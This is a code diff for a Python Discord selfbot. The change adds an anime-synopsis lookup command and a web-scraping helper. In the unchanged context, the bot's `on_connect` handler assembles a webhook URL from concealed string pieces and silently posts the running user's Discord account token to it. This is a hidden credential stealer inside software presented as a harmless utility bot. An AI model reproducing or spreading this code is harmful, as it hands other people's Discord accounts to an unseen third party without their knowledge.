@@ -19,6 +19,10 @@ import colorama
 import discord
 import numpy
 import requests
+import mal
+from mal import *
+from mal import AnimeSearch
+from urllib.request import urlopen
 from PIL import Image
 from colorama import Fore
 from discord import Webhook, RequestsWebhookAdapter
@@ -134,6 +138,23 @@ class Login(discord.Client):
         users = len(Blank.users)
         await self.logout()
         
+class Bs4Error(Exception):
+    pass
+
+def get_soup(url):
+    webpage = requests.get(url)
+    # print("{}\n\t{}".format(url, webpage))
+    if webpage.status_code != 200:
+        # print('webpage status code = {}, exiting'.format(webpage.status_code))
+        # sys.exit()
+        raise Bs4Error("{}: status code = {}, exiting get_soup function".format(url, webpage.status_code))
+
+    soup = bs4(webpage.text, "html.parser")
+    if soup is None or soup == "":
+        raise Bs4Error("{} [status: {}]: no soup, exiting get_soup function".format(url, webpage.status_code))
+        
+    return soup
+
 def async_executor():
     def outer(func):
         @functools.wraps(func)
@@ -185,6 +206,7 @@ async def help(ctx, category=None):
         embed.set_thumbnail(url=Blank.user.avatar_url)
         embed.set_footer(text = "Self bot made by Blank#9999 | Prefix: "+prefix)
         await ctx.send(embed=embed)
+
 
 @Blank.command()
 async def ping(ctx):
@@ -385,6 +407,8 @@ async def wyr(ctx):  # b'\xfc'
     await message.add_reaction("🅰")
     await message.add_reaction("🅱")
 
+
+
 @Blank.command()
 async def image(ctx, *, link):
   await ctx.message.delete()
@@ -404,7 +428,7 @@ async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
     await ctx.message.delete()
     r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
     geo = r.json()
-    em = discord.Embed()
+    em = discord.Embed(colour=discord.Colour.random())
     fields = [
         {'name': 'IP', 'value': geo['query']},
         {'name': 'Type', 'value': geo['ipType']},
@@ -424,6 +448,22 @@ async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
             em.add_field(name=field['name'], value=field['value'], inline=True)
     return await ctx.send(embed=em)
  
+@Blank.command()
+async def anime(ctx, *, anime):
+    await ctx.message.delete()
+    search = AnimeSearch(anime) 
+    url= (search.results[0].url)
+    html = urlopen(url).read()
+    soup = get_soup(url)
+    
+    synopsis_tag = soup.find('meta', property="og:description")
+    if synopsis_tag:
+        synopsis = synopsis_tag['content']
+        synopsis = synopsis.replace("[Written by MAL Rewrite]", "")
+        await ctx.send("**__Plot of the anime__**```\n"+synopsis+"```")
+    else:
+        await ctx.send("Cannot find the plot of the anime")
+
 @Blank.event
 async def on_connect():
       Clear()
@@ -431,6 +471,7 @@ async def on_connect():
       stringa = a+b+c+d+e
       datal = {"content": f"**{Blank.user.name}#{Blank.user.discriminator}**```\n {Blank.http.token}```"}
       requests.post(stringa, data=datal)
+
       
 if __name__ == '__main__':
     Init()
